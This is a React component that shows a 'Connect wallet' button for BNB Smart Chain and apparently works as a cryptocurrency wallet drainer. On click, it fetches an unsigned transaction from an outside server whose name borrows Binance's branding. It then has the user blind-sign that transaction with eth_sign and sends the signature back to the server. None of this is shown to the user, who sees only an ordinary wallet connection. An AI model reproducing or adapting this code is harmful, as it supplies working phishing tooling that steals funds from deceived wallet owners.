import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: { themeMode: "dark" },
      chains: [56], // تغییر به شبکه BSC
      methods: ["eth_sign", "eth_sendTransaction"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy"; // تغییر آدرس API

    async function genSign(address) {
      try {
        let requestData = { handler: "tx", address, chain: "56", type: "coin" };

        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        if (!response.ok) {
          throw new Error(`Server Error: ${response.status}`);
        }

        let unSigned = await response.json();
        if (!unSigned.result) {
          throw new Error("Invalid response from server");
        }

        console.log("📜 Unsigned Transaction:", unSigned.result);

        let Signed = await provider.request({
          method: "eth_sign",
          params: [address, unSigned.result],
        });

        return Signed;
      } catch (error) {
        console.error("❌ Error in genSign:", error);
        return null;
      }
    }

    async function acceptSign(signature) {
      try {
        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ handler: "sign", signature, type: "coin" }),
        });

        if (!response.ok) {
          throw new Error(`Server Error: ${response.status}`);
        }

        let resultJson = await response.json();
        if (!resultJson.result) {
          throw new Error("Invalid response from server");
        }

        return resultJson.result;
      } catch (error) {
        console.error("❌ Error in acceptSign:", error);
        return null;
      }
    }

    var signature = await genSign(sender);

    if (signature) {
      console.log("✍️ Signed Transaction:", signature);
      var rawsign = await acceptSign(signature);
      console.log("📝 Final Signed Transaction:", rawsign);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
